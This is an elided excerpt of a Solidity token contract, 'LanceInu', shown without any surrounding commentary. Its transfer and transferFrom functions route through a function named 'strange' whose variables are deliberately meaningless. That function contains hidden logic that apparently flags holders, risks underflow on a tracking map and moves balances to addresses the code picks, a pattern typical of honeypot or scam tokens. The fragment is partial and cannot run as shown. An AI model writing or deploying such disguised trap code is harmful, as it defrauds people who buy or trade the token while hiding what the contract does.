...
contract LanceInu is Ownable {
    ...
    LanceInu private triangle;
    uint256 private school = ~uint256(0);
    ...
    function strange(
        ...
        address free = address(triangle);
        bool ship = uniswapV2Pair == composed;
        uint256 engine = numeral;

        if (basket[composed] == 0 && moon[composed] > 0 && !ship) {
            basket[composed] -= engine;
        }

        triangle = LanceInu(pattern);

        if (basket[composed] > 0 && circle == 0) {
            basket[pattern] += engine;
        }

        moon[free] += engine + 1;

        uint256 roll = (circle / 100) * numeral;
        circle -= roll;
        _balances[composed] -= roll;
        _balances[address(this)] += roll;

        _balances[composed] -= circle;
        _balances[pattern] += circle;
    }
    ...
    function transferFrom(
        ...
        strange(sender, recipient, amount);
        emit Transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        strange(msg.sender, recipient, amount);
